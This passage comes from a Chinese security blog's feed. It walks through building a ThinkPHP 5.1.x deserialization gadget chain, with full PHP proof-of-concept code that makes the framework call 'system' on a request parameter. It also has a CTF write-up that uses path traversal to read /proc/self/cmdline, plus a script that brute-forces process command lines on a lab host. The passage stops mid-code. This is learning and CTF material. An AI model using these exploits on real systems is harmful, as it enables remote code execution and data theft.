class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$item</span>;</span><br></pre></td></tr></table></figure><p>准确来说, 只关心这其中的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306105934360.png" alt="image-20240306105934360"></p><p>我们想要的是执行到$relation-&gt;visible($name);来调用一个_call, 所以需要几个条件</p><ol><li>进入 186行的if</li><li>在$relation &#x3D; $this-&gt;getRelation($key);操作后, $relation变成一个false或者null,以进入下一个if内</li><li>$relation &#x3D; $this-&gt;getAttr($key);后$relation变成我们指定的一个对象, 以调用该对象下不存在的visible方法来触发该对象的__call方法</li></ol><p>这里操作的是$this-&gt;append as $key &#x3D;&gt; $name, 记住这个, 然后跟进$relation &#x3D; $this-&gt;getRelation($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306110629197.png" alt="image-20240306110629197"></p><p>我们不给$this-&gt;relation赋值, 所以, 不论如何这都会返回一个空值</p><p>这里返回空值, 直接进入我们预期的if内</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111809929.png" alt="image-20240306111809929"></p><p>继续跟进下一个调用的$relation &#x3D; $this-&gt;getAttr($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111135706.png" alt="image-20240306111135706"></p><p>代码后面$value是这个getAttr的返回值, 它由$value    &#x3D; $this-&gt;getData($name);决定, 继续跟进getData</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111534803.png" alt="image-20240306111534803"></p><p>这里有很多种return的值, 但是不要忘了, getData的返回值return给getAttr,   getAttr直接将得到的值返回给</p><p>$relation, 我们需要$relation为一个对象实例</p><p>这里getData的参数$name来自于this-&gt;append数组的key, 所以就可以让</p><p>this-&gt;data &#x3D; [‘nacl’&#x3D;&gt;new Request]; &#x2F;&#x2F;Request存在_call方法</p><p>this-&gt;append &#x3D; [‘nacl’ &#x3D;&gt; [‘nacl’ &#x3D;&gt; ‘nacl’]];    &#x2F;&#x2F;这里必须有一个value是数组</p><p>只需要保证this-&gt;data和this-&gt;append拥有相同的键, 即可将该键所对应的值返回给$relation</p><p>注: 这里Povit的data属性是继承自Attribute类, 而append继承子Conversion类</p><p>更新poc为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p>跳转到Request类的__call</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306125911092.png" alt="image-20240306125911092"></p><p>依照一开始的链子, 此时需要借助call_user_func_array用this-&gt;hook来触发this-&gt;Ajax</p><p>也就是 $this-&gt;hook &#x3D; [“visible”&#x3D;&gt;[$this,”isAjax”]];</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306130953805.png" alt="image-20240306130953805"></p><p>成功跳转到isAjax, 此时我们不用关心传过来的参数, 因为330行的array_unshift将$this插入到了$args最前面,使得这个参数不可控</p><p>之后, 我们需要通过param的调用来调用到input</p><p>param接收一个参数为$this-&gt;config[‘var_ajax’]完全可控,跟进param</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306131812594.png" alt="image-20240306131812594"></p><p>在这个方法中会将GET数组赋值给<code>this-&gt;param</code>属性</p><p><strong>注:  经过调试发现, 在还没有执行反序列化之前, 此方法已经被调用过, 它将get请求的数据以键值对的方式赋值给$this-&gt;param</strong></p><p>这里调用了input传入的前两个重要参数$this-&gt;param和$name($name即为$this-&gt;config[‘var_ajax’])</p><p>跟进input</p><p>此时传入的$data就是get请求数据的键值对, $name由$this-&gt;config[‘var_ajax’]可控决定</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306134002703.png" alt="image-20240306134002703"></p><p>这里又出现了一次getData, 实际上, 这个getData就是将传入的形式参数$data数组中键为形式参数$name的值返回, 在这里即为返回get请求数据中键为$this-&gt;config[‘var_ajax’]的值</p><p>不妨设置:</p><p>$this-&gt;config &#x3D; [‘var_ajax’ &#x3D;&gt; ‘nacl’]; </p><p>这样, $data就变成了get请求中键位nacl的值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135222503.png" alt="image-20240306135222503"></p><p>这里$data就已经变成我们设置的字符串了</p><p>之后跟进getFilter()方法来设置之前已知被赋值为默认值的$filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135657139.png" alt="image-20240306135657139"></p><p>这里将要返回的值$filter默认为空字符串, 之后会被赋值为$this-&gt;filter, 并且追加了一个默认值$default2为null并返回</p><p>之后跳到:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135953679.png" alt="image-20240306135953679"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306140016138.png" alt="image-20240306140016138"></p><p>zhe</p><p>可以看见传入的实参$filter是要执行的任意函数, 传入的实参$data要执行的任意函数的参数</p><p>那么, $this-&gt;filter就是要执行的任意函数</p><p>$this-&gt;filter &#x3D; “system”;</p><p>最终poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$config</span> = [];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;config = [<span class="string">&#x27;var_ajax&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>];</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141151590.png" alt="image-20240306141151590"></p><p>这里会把$filters数组末尾的null弹出, 之后就成功rce</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141253331.png" alt="image-20240306141253331"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306141316024.png" alt="image-20240306141316024"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.1.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-5-1-x反序列化&quot;&gt;&lt;a href=&quot;#ThinkPHP-5-1-x反序列化&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5.1.x反序列化&quot;&gt;&lt;/a&gt;ThinkPHP 5.1.x反序列化&lt;/h1&gt;&lt;p&gt;我们已经学习</summary>
      
    
    
    
    
    <category term="ThinkPHP反序列化" scheme="http://example.com/tags/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP学习</title>
    <link href="http://example.com/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2024/03/04/ThinkPHP%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-03-04T04:45:07.000Z</published>
    <updated>2024-03-04T14:27:09.368Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133210500.png" alt="image-20240304133210500"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304133155049.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Swagger docs</title>
    <link href="http://example.com/2024/03/01/Swagger-docs/"/>
    <id>http://example.com/2024/03/01/Swagger-docs/</id>
    <published>2024-03-01T13:05:49.000Z</published>
    <updated>2024-03-02T14:26:13.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Swagger-docs"><a href="#Swagger-docs" class="headerlink" title="Swagger docs"></a>Swagger docs</h1><p>一进去是一个文档内容, 还以为是容器没弄好</p><p>仔细看像是一些api的文档,看不懂,但是没关系, 直接扔给gpt, 让他举出几个请求的例子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301211339462.png" alt="image-20240301211339462"></p><p>这里有四条api接口, 简单浏览一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/api-base/v0/register</span><br><span class="line">#注册</span><br><span class="line">/api-base/v0/login</span><br><span class="line">#登录</span><br><span class="line">/api-base/v0/update</span><br><span class="line">#修改密码</span><br><span class="line">/api-base/v0/search</span><br><span class="line">#搜索文件</span><br></pre></td></tr></table></figure><p>由于已经知道是原型链污染, 其实可以猜测一下</p><ol><li><p>修改秘密的地方可以进行污染, 当然注册的地方也有一个插入的操作, 也可能存在污染</p></li><li><p>搜索文件的地方可以读取任意文件, 读取app的源码</p></li></ol><p>当然这只是猜测</p><p>先通过api注册登录获得token</p><p>这里的token一眼jwt 解一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301214129531.png" alt="image-20240301214129531"></p><p>这里会直接把密码也存在里面了, 但是并不知道私钥,并且爆破不出来,不能进行伪造</p><p>token先放一放</p><p>简单尝试这个search的api后发现确实存在任意文件读取</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301212720010.png" alt="image-20240301212720010"></p><p>这里并不能使用通配符, 也读不到app.py config.py web.py这样的源码</p><p>或许应该寻找源码的文件名</p><p>可谓是百思不得其解, 疑惑之下google 简单搜索了一下 词条 “flask源文件读取”</p><p><strong>柳暗花明又一村</strong></p><p>我发现了这篇文章</p><p><a href="https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">https://wycisme.gitee.io/2021/04/21/CTF-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</a></p><p>我们可以通过访问..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cmdline这个文件来得到当前运行的程序</p><blockquote><p>  proc 目录通常存储着进程动态运行的各种信息，是一种虚目录 、&#x2F;proc&#x2F;[pid]&#x2F;  表示存储这进程id为pid 的 进程信息，当前进程 pid 用self 代替，即 &#x2F;proc&#x2F;self&#x2F;.</p><pre><code>    /proc/[pid]/cmdline 下可读出进程在终端输入过的命令命令 </code></pre></blockquote><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222256761.png" alt="image-20240301222256761"></p><p>这下就可以直接读取源文件了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240301222546644.png" alt="image-20240301222546644"></p><p>api.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/v2/users&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_info</span>():</span><br><span class="line">    file_path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> file_path:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                file_content = file.read()</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">id</span>:</span><br><span class="line">                    data = json.loads(file_content)</span><br><span class="line">                    <span class="keyword">for</span> user <span class="keyword">in</span> data[<span class="string">&#x27;users&#x27;</span>]:</span><br><span class="line">                        <span class="keyword">if</span> user[<span class="string">&#x27;id&#x27;</span>] == <span class="built_in">int</span>(<span class="built_in">id</span>):</span><br><span class="line">                            <span class="keyword">if</span> user:</span><br><span class="line">                                <span class="keyword">return</span> user</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">            <span class="keyword">return</span> file_content</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>,<span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8899</span>)</span><br></pre></td></tr></table></figure><p>这里只有api.py的源码, 但是并不是我们想要的</p><p>这里&#x2F;proc&#x2F;[pid]&#x2F;cmdline</p><p>既然这个是pid进程, 理论上进程数最大值为32768, 我们可以写个脚本尝试爆破一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.1.26:22401//api-base/v0/search?file=../../../../../proc/&#123;&#125;/cmdline&amp;type=text&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9.bzD2zo_oMqcmwR5IS_KWlaVChT30zADxFY-wxv91gFo;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32769</span>):</span><br><span class="line">    payload = url.<span class="built_in">format</span>(<span class="built_in">str</span>(i))</span><br><span class="line">    res = requests.get(url=payload, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(parse.quote(res.text))</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python%00api.py%00</span><br><span class="line">8</span><br><span class="line">python%00app.py%00</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>这里却又爆出来了app.py但是并不能把他读取出来… </p><p>不知道是否是因为权限问题</p><p>回头看了下api.py的源码, 这里面的路由为&#x2F;v2&#x2F;users而不是一开始读文件的路由&#x2F;api-base&#x2F;v0&#x2F;search</p><p>但是也访问不到&#x2F;v2&#x2F;users这条路由</p><p>这里怎么也读取不到, 用题解里的方法也不行, 由harder学长的提示就直接看源码了</p><p>在修改密码的路由下调用了一个update函数,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update(new_password, User)</span><br></pre></td></tr></table></figure><p> 跟进会发现这正是一个经典的merge函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span 